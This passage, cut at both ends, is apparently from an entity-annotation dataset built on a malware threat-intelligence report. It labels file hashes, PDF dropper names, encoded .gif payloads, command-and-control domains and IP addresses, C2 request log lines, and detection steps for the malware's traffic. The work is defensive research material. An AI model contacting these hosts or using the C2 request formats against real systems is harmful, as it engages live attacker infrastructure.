"92465134302755552eb82bb39bb3327a08112e02", "pos": [0, 1], "sent_id": 82, "type": "SHA-1"}], [{"name": "0e924796517cbb62f3a30740eb60ac1a9829b24d", "pos": [1, 2], "sent_id": 82, "type": "SHA-1"}], [{"name": "53140342b8fe2dd7661fce0d0e88d909f55099db", "pos": [0, 1], "sent_id": 83, "type": "SHA-1"}], [{"name": "f8c6f1cc3b937e0d7501c098776945bdc7c83856", "pos": [1, 2], "sent_id": 83, "type": "SHA-1"}], [{"name": "582dbde44753e0af4996ddb63ab088221b2e49a2", "pos": [2, 3], "sent_id": 83, "type": "SHA-1"}], [{"name": "109e1e387f8b2bb8d92f45e79881809384e9ae54", "pos": [0, 1], "sent_id": 84, "type": "SHA-1"}], [{"name": "c39d0b12bb1c25cf46a5ae6b197a59f8ea90caa0", "pos": [0, 1], "sent_id": 85, "type": "SHA-1"}], [{"name": "6b1dd4fa0f9570760c02bbcf44acf74d752aa8f8", "pos": [0, 1], "sent_id": 86, "type": "SHA-1"}], [{"name": "5551408323086f31d9bc3358ab5b2ed4dde86c5d", "pos": [0, 1], "sent_id": 87, "type": "SHA-1"}], [{"name": "d3a1b7d35b314139ab87bf4cd3e7ce752b37e56a", "pos": [1, 2], "sent_id": 87, "type": "SHA-1"}], [{"name": "30b377e7dc2418607d8cf5d01ae1f925eab2f037", "pos": [0, 1], "sent_id": 88, "type": "SHA-1"}], [{"name": "280aadae40cb340894f17ce1ca00f7dda3eb4425", "pos": [0, 1], "sent_id": 89, "type": "SHA-1"}], [{"name": "6b56ff806ee0b094b4846f494257e84b62bee35f", "pos": [1, 2], "sent_id": 89, "type": "SHA-1"}], [{"name": "00da3d559f36e842d2411b8c47ee377650722da0", "pos": [0, 1], "sent_id": 90, "type": "SHA-1"}], [{"name": "a32817e9ff07bc69974221d9b7a9b980fa80b677", "pos": [0, 1], "sent_id": 91, "type": "SHA-1"}], [{"name": "0e5a4768d7020b336f58ea4d521756401c24efd4", "pos": [1, 2], "sent_id": 91, "type": "SHA-1"}], [{"name": "939ac22e8425654a57753bd4083e8cd16d337ee0", "pos": [0, 1], "sent_id": 92, "type": "SHA-1"}], [{"name": "f7932b0a5b710d4e7e698d3c990a875771698fce", "pos": [1, 2], "sent_id": 92, "type": "SHA-1"}], [{"name": "c9cedca208049c7bf08cba544ef32bb7a3ebe37a", "pos": [2, 3], "sent_id": 92, "type": "SHA-1"}], [{"name": "25a7c6b0f48e68f4ca135ecec46d3ad190d518d9", "pos": [0, 1], "sent_id": 93, "type": "SHA-1"}], [{"name": "9689ebbeeb544b9d1c00b71f3b886aeebcb92138", "pos": [0, 1], "sent_id": 94, "type": "SHA-1"}], [{"name": "95ad87fd28d7367fd5323d5281c044238dd4c303", "pos": [0, 1], "sent_id": 95, "type": "SHA-1"}], [{"name": "36b969c1b3c46953077e4aabb75be8cc6aa6a327", "pos": [0, 1], "sent_id": 96, "type": "SHA-1"}], [{"name": "b9d576a47cfebb2c3ff0ecc8cd7c352e6ce32b23", "pos": [1, 2], "sent_id": 96, "type": "SHA-1"}], [{"name": "366b41bcac6259c77ed5792becae75670a74c4c1", "pos": [2, 3], "sent_id": 96, "type": "SHA-1"}], [{"name": "8e3e6ea2c79c9994ded4922358898814efd2cbe0", "pos": [3, 4], "sent_id": 96, "type": "SHA-1"}], [{"name": "367030d5cf3ce7e9ef7770367f04c7dd88332374", "pos": [4, 5], "sent_id": 96, "type": "SHA-1"}], [{"name": "95d8b5e4bff4c35a7ef32f1cbb7e385a331c6138", "pos": [5, 6], "sent_id": 96, "type": "SHA-1"}], [{"name": "b42ab1b2b257f65ad18823ecb2f284c8fc118c26", "pos": [6, 7], "sent_id": 96, "type": "SHA-1"}], [{"name": "b72df8e1f24c4e05699fc892cfd536053d762065", "pos": [0, 1], "sent_id": 97, "type": "SHA-1"}], [{"name": "73366c1eb26b92886531586728be4975d56f7ca5", "pos": [0, 1], "sent_id": 98, "type": "SHA-1"}], [{"name": "554cd374591ee8bf0f062567c17beae54f9055ff", "pos": [0, 1], "sent_id": 99, "type": "SHA-1"}], [{"name": "6956a776f3395d1aee8a3c27e9db5eb2d38db32b", "pos": [0, 1], "sent_id": 100, "type": "SHA-1"}], [{"name": "40f8ee78fb9969c8ec9a795cb827dfb427c19036", "pos": [1, 2], "sent_id": 100, "type": "SHA-1"}], [{"name": "1ddcd6b1475f016d04d8a43ccb03abeb83371eda", "pos": [2, 3], "sent_id": 100, "type": "SHA-1"}], [{"name": "0cd54a0c3f7fdaf7a83e6a1ff818daf514e81e7a", "pos": [0, 1], "sent_id": 101, "type": "SHA-1"}], [{"name": "5acaea49540635670036dc626503431b5a783b56", "pos": [1, 2], "sent_id": 101, "type": "SHA-1"}], [{"name": "fef95bdb9f984bcbb89f3a29928263dfc01aef72", "pos": [0, 1], "sent_id": 102, "type": "SHA-1"}], [{"name": "f62600984c5086f2da3d70bc1f5042cf464f928d", "pos": [1, 2], "sent_id": 102, "type": "SHA-1"}], [{"name": "1747a7a74a6fac25bc4315b8d3a8311ce8a082e2", "pos": [2, 3], "sent_id": 102, "type": "SHA-1"}], [{"name": "501452d2c21bb8248e068932920554db6204a7f2", "pos": [3, 4], "sent_id": 102, "type": "SHA-1"}], [{"name": "4bba1d30c971fdd23131e8ec1d768066b400f0a1", "pos": [4, 5], "sent_id": 102, "type": "SHA-1"}], [{"name": "49889f3db0d70b716aa3cb2ab571f0b4a56a6f99", "pos": [5, 6], "sent_id": 102, "type": "SHA-1"}], [{"name": "551bf2d2268dba5d22e91fdd7ca9832bc8874bcc", "pos": [0, 1], "sent_id": 103, "type": "SHA-1"}], [{"name": "824d383bb5093e3a6c232afca3293779a297c0ad", "pos": [0, 1], "sent_id": 104, "type": "SHA-1"}], [{"name": "95760332c76b32919d4c053b3360ecad4811256a", "pos": [1, 2], "sent_id": 104, "type": "SHA-1"}], [{"name": "f484d874097ca95e5a86f43a15ef184bec1e972a", "pos": [0, 1], "sent_id": 105, "type": "SHA-1"}], [{"name": "b1dec7f17381cf41699184ec4bc591ff20b451b3", "pos": [0, 1], "sent_id": 106, "type": "SHA-1"}], [{"name": "296fd4c5b4bf8ea288f45b4801512d7dec7c497b", "pos": [1, 2], "sent_id": 106, "type": "SHA-1"}], [{"name": "e6429ea40864e36dd6a25cab00b416ff207825a7", "pos": [2, 3], "sent_id": 106, "type": "SHA-1"}], [{"name": "df64ac1bb4ca177539e3fa669dcc471d3093ff2f", "pos": [3, 4], "sent_id": 106, "type": "SHA-1"}], [{"name": "c20ba675d5df997623c7da4c79ca9be5c995eb3c", "pos": [3, 4], "sent_id": 107, "type": "SHA-1"}], [{"name": "4a88e007bbd9a729fde016de1c9709cd06818ef7", "pos": [4, 5], "sent_id": 107, "type": "SHA-1"}], [{"name": "ff2319abaeded930feb0ddbcb47fdfc2d57e182c", "pos": [0, 1], "sent_id": 108, "type": "SHA-1"}], [{"name": "a4445f1ae3e2d5196eb4292121e6cf0d1cc5dad2", "pos": [0, 1], "sent_id": 109, "type": "SHA-1"}], [{"name": "7419bfc9d393b2a9fbd09c18ea4a31ce98d60342", "pos": [1, 2], "sent_id": 109, "type": "SHA-1"}], [{"name": "7e57c80574fdebf5f3fedce5a2ebb62d49de1345", "pos": [0, 1], "sent_id": 110, "type": "SHA-1"}], [{"name": "5316a02c1e120885a2382e95a3eb0c1f8fd69551", "pos": [1, 2], "sent_id": 110, "type": "SHA-1"}], [{"name": "60efd28c07d07d10d50b5ad00c243e17e7f1707e", "pos": [0, 1], "sent_id": 111, "type": "SHA-1"}], [{"name": "862305dedb93100aee6ef07c858c3a0b6878620e", "pos": [1, 2], "sent_id": 111, "type": "SHA-1"}], [{"name": "634a1649995309b9c7d163af627f7e39f42d5968", "pos": [0, 1], "sent_id": 112, "type": "SHA-1"}], [{"name": "997d5765e4cc7475fa2cf64233af9b51ddf219f2", "pos": [1, 2], "sent_id": 112, "type": "SHA-1"}], [{"name": "81c99d19ea8065cfff6dc76a950b9d1b25a5f7a9", "pos": [0, 1], "sent_id": 113, "type": "SHA-1"}], [{"name": "c6fd105437e9ddd914721f3ba7fcbc6bef39067a", "pos": [0, 1], "sent_id": 114, "type": "SHA-1"}], [{"name": "6f530edc584a18df98ee7fade2dd03b610955e23", "pos": [0, 1], "sent_id": 115, "type": "SHA-1"}], [{"name": "8802cbff6f2b39932e9b699d89a6f3a407cd39a7", "pos": [1, 2], "sent_id": 115, "type": "SHA-1"}], [{"name": "c0c26060b4f003322f3cda9dee294fd6221b85da", "pos": [2, 3], "sent_id": 115, "type": "SHA-1"}], [{"name": "1160010b1df2601fe176353be76ba1a922425dc6", "pos": [3, 4], "sent_id": 115, "type": "SHA-1"}], [{"name": "edf74413a6e2763147184b5e1b8732537a854365", "pos": [4, 5], "sent_id": 115, "type": "SHA-1"}], [{"name": "49989446d542b1face2c031a205a702178dc2496", "pos": [5, 6], "sent_id": 115, "type": "SHA-1"}], [{"name": "ebe78cc14bb8e13374da4264c41df24dc0ceeaa7", "pos": [0, 1], "sent_id": 116, "type": "SHA-1"}], [{"name": "071b67b2645e574f6fc5ba889c041bb2ee85f6d8", "pos": [1, 2], "sent_id": 116, "type": "SHA-1"}], [{"name": "31ab6830f4e39c2c520ae55d4c4bffe0b347c947", "pos": [0, 1], "sent_id": 117, "type": "SHA-1"}], [{"name": "53d1c812510c51d0b6eec767d15f740ea54135b5", "pos": [1, 2], "sent_id": 117, "type": "SHA-1"}], [{"name": "223c7eb7b9dde08ee028bba6552409ee144db54a", "pos": [0, 1], "sent_id": 118, "type": "SHA-1"}], [{"name": "be1a53afaab89f47a91a21b0d65415af1b5d1bff", "pos": [1, 2], "sent_id": 118, "type": "SHA-1"}], [{"name": "3171957cfeb7b415f21b04f9a587b0c339b5c0e3", "pos": [0, 1], "sent_id": 119, "type": "SHA-1"}], [{"name": "898a3e5e34eeb3349aa6f291c31195dc02bb9530", "pos": [1, 2], "sent_id": 119, "type": "SHA-1"}], [{"name": "f0f7d755add2305bceaacfe6840d61ccd5f03b0f", "pos": [2, 3], "sent_id": 119, "type": "SHA-1"}], [{"name": "0b1e28ecd5b4eb14519470775dce965c63579640", "pos": [3, 4], "sent_id": 119, "type": "SHA-1"}], [{"name": "683104d28bd5c52c53d2e6c710a7bd19676c28b8", "pos": [0, 1], "sent_id": 120, "type": "SHA-1"}], [{"name": "ba884173e98a4f2b6af6acc7f702ead14b146960", "pos": [0, 1], "sent_id": 121, "type": "SHA-1"}], [{"name": "f30ba7eeebd97843f0bcf9c3930741fa29c132cd", "pos": [0, 1], "sent_id": 122, "type": "SHA-1"}], [{"name": "6c889228219012b25387bf3e063136b994d2dcac", "pos": [1, 2], "sent_id": 122, "type": "SHA-1"}], [{"name": "e804f3bf72bfda867fd3725a82da6212e29dbfc4", "pos": [0, 1], "sent_id": 123, "type": "SHA-1"}], [{"name": "07e26464e17a750bb60665c377b41efd23c440b6", "pos": [0, 1], "sent_id": 124, "type": "SHA-1"}], [{"name": "827de388e0feabd92fe7bd433138aa35142bd01a", "pos": [1, 2], "sent_id": 124, "type": "SHA-1"}], [{"name": "28ec7eb49f7af3ca7787e4566b144d8ea544a78d", "pos": [0, 1], "sent_id": 125, "type": "SHA-1"}], [{"name": "08a4baa154dc41d7dee9bd424c2679253c743ee3", "pos": [1, 2], "sent_id": 125, "type": "SHA-1"}], [{"name": "84fa36acb51a0569ed931f1db5d44ec907dcb624", "pos": [2, 3], "sent_id": 125, "type": "SHA-1"}], [{"name": "d81b0705d26390eb82188c03644786dd6f1a2a9e", "pos": [3, 4], "sent_id": 125, "type": "SHA-1"}], [{"name": "07a9975d7d96ff3b56de024ab2017582", "pos": [0, 1], "sent_id": 132, "type": "MD5"}], [{"name": "07a9975d7d96ff3b56de024ab2017582", "pos": [0, 1], "sent_id": 132, "type": "MD5"}], [{"name": "43cd449e3b0c1ecde8136eeb710de233", "pos": [0, 1], "sent_id": 133, "type": "MD5"}], [{"name": "85a645c42e2fcf718c211ebc6cbc71b8", "pos": [1, 2], "sent_id": 133, "type": "MD5"}], [{"name": "a9315dc0ff95809839af3b95e7de329d", "pos": [2, 3], "sent_id": 133, "type": "MD5"}], [{"name": "92ff4df1d079a003ae2a8ac47dd5e81b", "pos": [3, 4], "sent_id": 133, "type": "MD5"}], [{"name": "bf0253ee830b498bd442c3b97aec1270", "pos": [4, 5], "sent_id": 133, "type": "MD5"}], [{"name": "c48d0822eedd75c9c56f688fb8a05259", "pos": [0, 1], "sent_id": 134, "type": "MD5"}], [{"name": "44ee71de720fc1a50c919bc5a01c592d", "pos": [1, 2], "sent_id": 134, "type": "MD5"}], [{"name": "626489f8cafacb1b24fe6ecf0db52f23", "pos": [2, 3], "sent_id": 134, "type": "MD5"}], [{"name": "*1109821546.gif", "pos": [3, 5], "sent_id": 134, "type": "File"}], [{"name": "*1109821546.gif", "pos": [3, 5], "sent_id": 134, "type": "File"}], [{"name": "*1109821546.gif", "pos": [3, 5], "sent_id": 134, "type": "File"}], [{"name": "*1109821546.gif", "pos": [3, 5], "sent_id": 134, "type": "File"}], [{"name": "*174239657.gif", "pos": [5, 7], "sent_id": 134, "type": "File"}], [{"name": "*174239657.gif", "pos": [5, 7], "sent_id": 134, "type": "File"}], [{"name": "*2334309658.gif", "pos": [0, 2], "sent_id": 135, "type": "File"}], [{"name": "*2334309658.gif", "pos": [0, 2], "sent_id": 135, "type": "File"}], [{"name": "*2618653991.gif", "pos": [2, 4], "sent_id": 135, "type": "File"}], [{"name": "*2618653991.gif", "pos": [2, 4], "sent_id": 135, "type": "File"}], [{"name": "*2627081433.gif", "pos": [0, 2], "sent_id": 136, "type": "File"}], [{"name": "*2627081433.gif", "pos": [0, 2], "sent_id": 136, "type": "File"}], [{"name": "*3100425864.gif", "pos": [2, 4], "sent_id": 136, "type": "File"}], [{"name": "*3100425864.gif", "pos": [2, 4], "sent_id": 136, "type": "File"}], [{"name": "*3198217296.gif", "pos": [0, 2], "sent_id": 137, "type": "File"}], [{"name": "*3198217296.gif", "pos": [0, 2], "sent_id": 137, "type": "File"}], [{"name": "*3946889701.gif", "pos": [0, 2], "sent_id": 138, "type": "File"}], [{"name": "*3946889701.gif", "pos": [0, 2], "sent_id": 138, "type": "File"}], [{"name": "*3979106736.gif", "pos": [2, 4], "sent_id": 138, "type": "File"}], [{"name": "*3979106736.gif", "pos": [2, 4], "sent_id": 138, "type": "File"}], [{"name": "03f8485cacb0458194d2bbef9f33cc06", "pos": [4, 5], "sent_id": 138, "type": "MD5"}], [{"name": "738c60fff066934b6f33e368cfe9a88c", "pos": [5, 6], "sent_id": 138, "type": "MD5"}], [{"name": "738c60fff066934b6f33e368cfe9a88c", "pos": [5, 6], "sent_id": 138, "type": "MD5"}], [{"name": "cf59ed2b5473281cc2e083eba3f4b662", "pos": [6, 7], "sent_id": 138, "type": "MD5"}], [{"name": "b8d1d74a0ad4985adaf9afe4c868ae0b", "pos": [7, 8], "sent_id": 138, "type": "MD5"}], [{"name": "c79a35313238e71a17d19de979a0d63a", "pos": [0, 1], "sent_id": 139, "type": "MD5"}], [{"name": "18e64b8e5ce5bdd33ce8bd9e00af672c", "pos": [1, 2], "sent_id": 139, "type": "MD5"}], [{"name": "86ef8f5f62ae8590d6edf45e04806515", "pos": [2, 3], "sent_id": 139, "type": "MD5"}], [{"name": "4c6608203e751cf27f627220269d6835", "pos": [3, 4], "sent_id": 139, "type": "MD5"}], [{"name": "78e51be60eab2c6e952c9538a46ab521", "pos": [0, 1], "sent_id": 140, "type": "MD5"}], [{"name": "b798c968cbfd53f878e13c7698610d9c", "pos": [0, 1], "sent_id": 141, "type": "MD5"}], [{"name": "f5f84c0c7ae871c2aa3cfe25199da628", "pos": [1, 2], "sent_id": 141, "type": "MD5"}], [{"name": "f78454d4ac3e4fe9ef5cac69b1ec43d7", "pos": [0, 1], "sent_id": 142, "type": "MD5"}], [{"name": "811f66d6dd2c713073c0b0aebbe74ce8", "pos": [1, 2], "sent_id": 142, "type": "MD5"}], [{"name": "*626088424.gif", "pos": [2, 4], "sent_id": 142, "type": "File"}], [{"name": "*626088424.gif", "pos": [2, 4], "sent_id": 142, "type": "File"}], [{"name": "*1109821546.gif_dec", "pos": [4, 6], "sent_id": 142, "type": "File"}], [{"name": "*1109821546.gif_dec", "pos": [4, 6], "sent_id": 142, "type": "File"}], [{"name": "*1109821546.gif_dec", "pos": [4, 6], "sent_id": 142, "type": "File"}], [{"name": "*1109821546.gif_dec", "pos": [4, 6], "sent_id": 142, "type": "File"}], [{"name": "*174239657.gif_dec", "pos": [6, 8], "sent_id": 142, "type": "File"}], [{"name": "*174239657.gif_dec", "pos": [6, 8], "sent_id": 142, "type": "File"}], [{"name": "*2334309658.gif_dec", "pos": [0, 2], "sent_id": 143, "type": "File"}], [{"name": "*2334309658.gif_dec", "pos": [0, 2], "sent_id": 143, "type": "File"}], [{"name": "*2618653991.gif_dec", "pos": [0, 2], "sent_id": 144, "type": "File"}], [{"name": "*2618653991.gif_dec", "pos": [0, 2], "sent_id": 144, "type": "File"}], [{"name": "*2627081433.gif_dec", "pos": [2, 4], "sent_id": 144, "type": "File"}], [{"name": "*2627081433.gif_dec", "pos": [2, 4], "sent_id": 144, "type": "File"}], [{"name": "*3100425864.gif_dec", "pos": [4, 6], "sent_id": 144, "type": "File"}], [{"name": "*3100425864.gif_dec", "pos": [4, 6], "sent_id": 144, "type": "File"}], [{"name": "*3198217296.gif_dec", "pos": [0, 2], "sent_id": 145, "type": "File"}], [{"name": "*3198217296.gif_dec", "pos": [0, 2], "sent_id": 145, "type": "File"}], [{"name": "*3946889701.gif_dec", "pos": [2, 4], "sent_id": 145, "type": "File"}], [{"name": "*3946889701.gif_dec", "pos": [2, 4], "sent_id": 145, "type": "File"}], [{"name": "*3979106736.gif_dec", "pos": [4, 6], "sent_id": 145, "type": "File"}], [{"name": "*3979106736.gif_dec", "pos": [4, 6], "sent_id": 145, "type": "File"}], [{"name": "*626088424.gif_dec", "pos": [0, 2], "sent_id": 146, "type": "File"}], [{"name": "*626088424.gif_dec", "pos": [0, 2], "sent_id": 146, "type": "File"}], [{"name": "*4137794344.gif", "pos": [2, 4], "sent_id": 147, "type": "File"}], [{"name": "*4137794344.gif", "pos": [2, 4], "sent_id": 147, "type": "File"}], [{"name": "*4137794344.gif_dec", "pos": [4, 6], "sent_id": 147, "type": "File"}], [{"name": "*4137794344.gif_dec", "pos": [4, 6], "sent_id": 147, "type": "File"}], [{"name": "31a31f6be9c31cb2d02c04176eb500f1aba14dd0", "pos": [17, 18], "sent_id": 147, "type": "SHA-1"}], [{"name": "804701959a1dbfbbfc6d8142de850db9fce9a611", "pos": [18, 19], "sent_id": 147, "type": "SHA-1"}], [{"name": "804701959a1dbfbbfc6d8142de850db9fce9a611", "pos": [18, 19], "sent_id": 147, "type": "SHA-1"}], [{"name": "ac4642885ca779e7b66b8bb6aa21d3c0396f7a1d", "pos": [19, 20], "sent_id": 147, "type": "SHA-1"}], [{"name": "d8c6d3e6988516595399003d1db0abd7df334d87", "pos": [20, 21], "sent_id": 147, "type": "SHA-1"}], [{"name": "6cf8ca847ee317255a9084bb44ae3f38ef61e5c3", "pos": [0, 1], "sent_id": 148, "type": "SHA-1"}], [{"name": "0fc29adc3aca39f32763096e090a6a69e50a716f", "pos": [0, 1], "sent_id": 149, "type": "SHA-1"}], [{"name": "1df9b4dc693ce7250f51cbc7ced53ad0a6e1c587", "pos": [0, 1], "sent_id": 150, "type": "SHA-1"}], [{"name": "9d716d2f8f1c2841a2707eba2ebadd01ed830030", "pos": [0, 1], "sent_id": 151, "type": "SHA-1"}], [{"name": "497f9c688ed142ae91e354b3d9c9e13243a268b0", "pos": [1, 2], "sent_id": 151, "type": "SHA-1"}], [{"name": "b464fc5cab7a93e5607b2abb49f343e81f4fa2f1", "pos": [2, 3], "sent_id": 151, "type": "SHA-1"}], [{"name": "15c75472f160f082f6905d57a98de94c026e2c56", "pos": [3, 4], "sent_id": 151, "type": "SHA-1"}], [{"name": "15c75472f160f082f6905d57a98de94c026e2c56", "pos": [3, 4], "sent_id": 151, "type": "SHA-1"}], [{"name": "00852745cb40730dc333124549a768b471dff4bc", "pos": [4, 5], "sent_id": 151, "type": "SHA-1"}], [{"name": "8cce571ca74e4b0074c09acb814541a0192ea9a8", "pos": [5, 6], "sent_id": 151, "type": "SHA-1"}], [{"name": "781d0b12bbe0a862d4a5527cd85489551cfe5d31", "pos": [6, 7], "sent_id": 151, "type": "SHA-1"}], [{"name": "e4add0b118113b2627143c7ef1d5b1327de395f1", "pos": [7, 8], "sent_id": 151, "type": "SHA-1"}], [{"name": "493d0660c9cf738be08209bfd56351d4cf075877", "pos": [8, 9], "sent_id": 151, "type": "SHA-1"}], [{"name": "118114446847ead7a2fe87ecb4943fdbdd2bbd1e", "pos": [9, 10], "sent_id": 151, "type": "SHA-1"}], [{"name": "0e263d80c46d5a538115f71e077a6175168abc5c", "pos": [10, 11], "sent_id": 151, "type": "SHA-1"}], [{"name": "d22d80da6f042c4da3392a69c713ee4d64be8bc8", "pos": [11, 12], "sent_id": 151, "type": "SHA-1"}], [{"name": "71d059edb81acb6b65213386bda3e2bdc724fa0f", "pos": [0, 1], "sent_id": 152, "type": "SHA-1"}], [{"name": "e17d004cd57f5f5eaa3652c926793d57ef88f1ec", "pos": [3, 4], "sent_id": 152, "type": "SHA-1"}], [{"name": "416d1035168b99cc8ba7227d4c7c3c6bc1ce169a", "pos": [4, 5], "sent_id": 152, "type": "SHA-1"}], [{"name": "3668b018b4bb080d1875aee346e3650a", "pos": [0, 1], "sent_id": 163, "type": "MD5"}], [{"name": "88292d7181514fda5390292d73da28d4", "pos": [1, 2], "sent_id": 163, "type": "MD5"}], [{"name": "3f301758aa3d5d123a9ddbad1890853b", "pos": [0, 1], "sent_id": 164, "type": "MD5"}], [{"name": "0cdf55626e56ffbf1b198beb4f6ed559", "pos": [1, 2], "sent_id": 164, "type": "MD5"}], [{"name": "cf5a5239ada9b43592757c0d7bf66169", "pos": [0, 1], "sent_id": 165, "type": "MD5"}], [{"name": "c03bcb0cde62b3f45b4d772ab635e2b0", "pos": [1, 2], "sent_id": 165, "type": "MD5"}], [{"name": "action_plan.pdf", "pos": [5, 6], "sent_id": 166, "type": "Dropper"}], [{"name": "Belgium", "pos": [9, 10], "sent_id": 166, "type": "Country"}], [{"name": "ASEM_seminar.pdf", "pos": [0, 1], "sent_id": 167, "type": "Dropper"}], [{"name": "Hungary", "pos": [4, 5], "sent_id": 167, "type": "Country"}], [{"name": "EUAG_report.pdf", "pos": [0, 1], "sent_id": 168, "type": "Dropper"}], [{"name": "EUAG_report.pdf", "pos": [0, 1], "sent_id": 168, "type": "Dropper"}], [{"name": "report.pdf", "pos": [0, 1], "sent_id": 168, "type": "Dropper"}], [{"name": "Luxembourg", "pos": [4, 5], "sent_id": 168, "type": "Country"}], [{"name": "Spain", "pos": [4, 5], "sent_id": 169, "type": "Country"}], [{"name": "Belgium", "pos": [4, 5], "sent_id": 170, "type": "Country"}], [{"name": "The 2013 Armenian Economic Association.pdf", "pos": [0, 5], "sent_id": 171, "type": "Dropper"}], [{"name": "ProcessExplorer", "pos": [14, 15], "sent_id": 181, "type": "Software"}], [{"name": "SysInternals ProcessExplorer", "pos": [18, 20], "sent_id": 183, "type": "Software"}], [{"name": "GqOlls", "pos": [12, 13], "sent_id": 184, "type": "Indicator"}], [{"name": "base.cat", "pos": [11, 12], "sent_id": 188, "type": "File"}], [{"name": "113e6fc85317fdd135e3f5f19e6c7a58", "pos": [13, 14], "sent_id": 188, "type": "MD5"}], [{"name": "~6rld.tmp", "pos": [3, 4], "sent_id": 189, "type": "File"}], [{"name": "c786a4cdfe08dbe7c64972a14669c4d1", "pos": [5, 6], "sent_id": 189, "type": "MD5"}], [{"name": "search for any *.cmd files with content \u201cTASKKILL /f /IM acro*\u201d", "pos": [3, 18], "sent_id": 193, "type": "CourseOfAction"}], [{"name": "news.grouptumbler.com", "pos": [43, 44], "sent_id": 195, "type": "Indicator"}], [{"name": "Google search", "pos": [0, 2], "sent_id": 200, "type": "Exploit"}], [{"name": "Twitter messaging service", "pos": [5, 8], "sent_id": 201, "type": "Exploit"}], [{"name": "Hungary", "pos": [25, 26], "sent_id": 203, "type": "Country"}], [{"name": "194.38.160.153", "pos": [27, 28], "sent_id": 203, "type": "Address"}], [{"name": "Switzerland", "pos": [0, 1], "sent_id": 204, "type": "Country"}], [{"name": "/lib/index.php", "pos": [1, 4], "sent_id": 204, "type": "File"}], [{"name": "/srch/index.php", "pos": [4, 7], "sent_id": 204, "type": "File"}], [{"name": "/forumengine/index.php", "pos": [7, 10], "sent_id": 204, "type": "File"}], [{"name": "/events/index.php", "pos": [10, 13], "sent_id": 204, "type": "File"}], [{"name": "Luxembourg", "pos": [15, 16], "sent_id": 204, "type": "Country"}], [{"name": "artas.org", "pos": [16, 17], "sent_id": 204, "type": "Indicator"}], [{"name": "95.128.72.24", "pos": [17, 18], "sent_id": 204, "type": "Address"}], [{"name": "France", "pos": [0, 1], "sent_id": 205, "type": "Country"}], [{"name": "/engine/index.php", "pos": [1, 4], "sent_id": 205, "type": "File"}], [{"name": "/web/index.php", "pos": [4, 7], "sent_id": 205, "type": "File"}], [{"name": "Belgium", "pos": [7, 8], "sent_id": 205, "type": "Country"}], [{"name": "tsoftonline.com", "pos": [8, 9], "sent_id": 205, "type": "Indicator"}], [{"name": "72.34.47.186", "pos": [9, 10], "sent_id": 205, "type": "Address"}], [{"name": "United States", "pos": [0, 2], "sent_id": 206, "type": "Country"}], [{"name": "/views/index.php", "pos": [2, 5], "sent_id": 206, "type": "File"}], [{"name": "www.eamtm.com", "pos": [8, 9], "sent_id": 206, "type": "Indicator"}], [{"name": "188.40.99.143", "pos": [9, 10], "sent_id": 206, "type": "Address"}], [{"name": "Germany", "pos": [0, 1], "sent_id": 207, "type": "Country"}], [{"name": "/piwik/web/index.php", "pos": [1, 6], "sent_id": 207, "type": "File"}], [{"name": "news.grouptumbler.com", "pos": [17, 18], "sent_id": 207, "type": "Indicator"}], [{"name": "Panama", "pos": [23, 24], "sent_id": 207, "type": "Country"}], [{"name": "200.63.46.23", "pos": [11, 12], "sent_id": 209, "type": "Address"}], [{"name": "200.63.46.23", "pos": [3, 4], "sent_id": 210, "type": "Address"}], [{"name": "Known search strings in Google search", "pos": [27, 33], "sent_id": 214, "type": "CourseOfAction"}], [{"name": "lUFEfiHKljfLKWPR", "pos": [0, 1], "sent_id": 216, "type": "Indicator"}], [{"name": "HkyeiIDKiroLaKYr", "pos": [1, 2], "sent_id": 216, "type": "Indicator"}], [{"name": "lUFEfiHKDroLaKYr", "pos": [0, 1], "sent_id": 217, "type": "Indicator"}], [{"name": "arabooks", "pos": [12, 13], "sent_id": 223, "type": "Indicator"}], [{"name": "Base64 encoding", "pos": [26, 28], "sent_id": 230, "type": "Obfuscation"}], [{"name": "<binary data ( ~100 bytes)>|<numerical ID ( ~10 digits)>|<version number>", "pos": [9, 21], "sent_id": 233, "type": "Indicator"}], [{"name": "<1digit><dot><two digits>", "pos": [9, 13], "sent_id": 236, "type": "Indicator"}], [{"name": "Check if there is only one GET parameter", "pos": [11, 19], "sent_id": 239, "type": "CourseOfAction"}], [{"name": "check if path is not empty and contains index.php", "pos": [21, 30], "sent_id": 239, "type": "CourseOfAction"}], [{"name": "convert the Base64-like GET parameter string into real Base64 encoding, and check if it decodes correctly", "pos": [36, 55], "sent_id": 239, "type": "CourseOfAction"}], [{"name": "check if the decoded string has at least two delimieter character \"|\" in it", "pos": [56, 72], "sent_id": 239, "type": "CourseOfAction"}], [{"name": "check if after the last but first \u201c|\u201d character, there are digits only", "pos": [0, 16], "sent_id": 240, "type": "CourseOfAction"}], [{"name": "check if the version part of the string follows the format \u201c1.11\u201d or similar", "pos": [17, 33], "sent_id": 240, "type": "CourseOfAction"}], [{"name": "\u201eGET /search/?q=lUFEfiHKDroLaKYr HTTP/1.1\" 304 211 \"-\" \"Opera/7.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US; WOW64)\"", "pos": [10, 41], "sent_id": 304, "type": "Indicator"}], [{"name": "\u201eGET /search?q=lUFEfiHKDroLaKYr HTTP/1.1\" 301 588 \"-\" \"Opera/5.0 (Windows; U; Windows NT 5.2; en-US; Trident/4.0)\"", "pos": [41, 71], "sent_id": 304, "type": "Indicator"}], [{"name": "\u201eGET /search?q=lUFEfiHKDroLaKYr HTTP/1.1\" 301 588 \"-\" \"Opera/4.0 (Windows NT 5.1; en-GB; Trident/4.0)\"", "pos": [71, 97], "sent_id": 304, "type": "Indicator"}], [{"name": "\"GET /EdithAlbert11 HTTP/1.1\" 404 1229 \"-\" \"Mozilla/6.0 (X11; Linux x86_64; en-GB; Trident/5.0)\"", "pos": [8, 33], "sent_id": 305, "type": "Indicator"}], [{"name": "\"GET /ifsWcj9a HTTP/1.1\" 404 529 \"-\" \"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; en-GB; WOW64; Trident/5.0)\"", "pos": [33, 64], "sent_id": 305, "type": "Indicator"}], [{"name": "\"GET /EdithAlbert11 HTTP/1.1\" 404 644 \"-\" \"Mozilla/5.0 (Windows NT 5.1; en-GB; Trident/4.0)\"", "pos": [64, 88], "sent_id": 305, "type": "Indicator"}], [{"name": "\"GET /ifsWcj9a HTTP/1.1\" 404 529 \"-\" \"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; en; WOW64; Trident/5.0)\"", "pos": [88, 117], "sent_id": 305, "type": "Indicator"}], [{"name": "\"GET /EdithAlbert11 HTTP/1.1\" 404 1229 \"-\" \"Mozilla/7.0 (compatible; MSIE 7.0; Windows NT 6.0; en-GB; WOW64)\"", "pos": [117, 146], 